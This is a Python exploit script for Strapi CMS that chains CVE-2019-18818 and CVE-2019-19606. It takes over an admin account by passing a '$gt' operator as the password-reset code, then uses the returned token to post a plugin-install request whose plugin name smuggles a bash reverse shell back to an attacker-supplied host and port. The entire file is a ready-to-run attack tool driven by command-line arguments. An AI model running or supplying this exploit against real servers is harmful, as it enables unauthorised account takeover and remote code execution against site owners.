import requests
import json
import argparse
 
class Strapi():
    def __init__(self,target,email,password,lhost,lport):
        self.target = target
        self.email = email
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.url = self.check_url()
        self.check_version()

    def check_url(self): 
        check = self.target[-1] 
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def check_version(self):
        requests.packages.urllib3.disable_warnings()
        version_url = self.url + "admin/strapiVersion"

        version = json.loads(requests.get(version_url,verify=False).text)
        
        print("Detected version found in /admin/strapiVersion: " + version["strapiVersion"])
        while True:
            version_question = input("For password change, is version less than beta-17.5? y or n? ")
            if version_question == "y":
                self.jwt = self.change_pass()
                self.rce_exploit()
            elif version_question == "n":
                print("Password change won't work with this version but press y if you still want to try.")
            else:
                print("Invalid input. Only y or n")

    def change_pass(self):
        requests.packages.urllib3.disable_warnings()
        self.est_session = requests.Session()
        
        print("Sending password reset request...")
        reset_request = {"email":self.email, "url": self.url + "admin/plugins/users-permissions/auth/reset-password"}
        self.est_session.post(self.url, json=reset_request,verify=False)
        
        print("Setting new password...")
        pass_change_exploit = {"code":{"$gt":0}, "password":self.password, "passwordConfirmation":self.password}
        pass_change_req = json.loads(self.est_session.post(self.url + "admin/auth/reset-password", json=pass_change_exploit,verify=False).text)

        print("Response:\n")
        print(pass_change_req)
        return pass_change_req["jwt"]

    def rce_exploit(self):
        requests.packages.urllib3.disable_warnings()
        print("\nSending Reverse Shell payload\n")
        
        cmd = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
        rev_shell = "documentation && $(" + cmd + ")"

        jwt_header = { "Authorization": "Bearer " + self.jwt} 
        rce_exploit = {"plugin":rev_shell, "port":"1337"}
        requests.post(self.url + "admin/plugins/install",headers=jwt_header,json=rce_exploit,verify=False) 

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Strapi CMS CVE-2019-18818 and 19606 / Authenticated Blind Remote Code Execution')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://strapi.hack', required=True)
    parser.add_argument('-e', metavar='<email>', help='Email', required=True)
    parser.add_argument('-p', metavar='<new password>', help="Password", required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    try:
        Strapi(args.t,args.e,args.p,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("Bye Bye!")
        exit()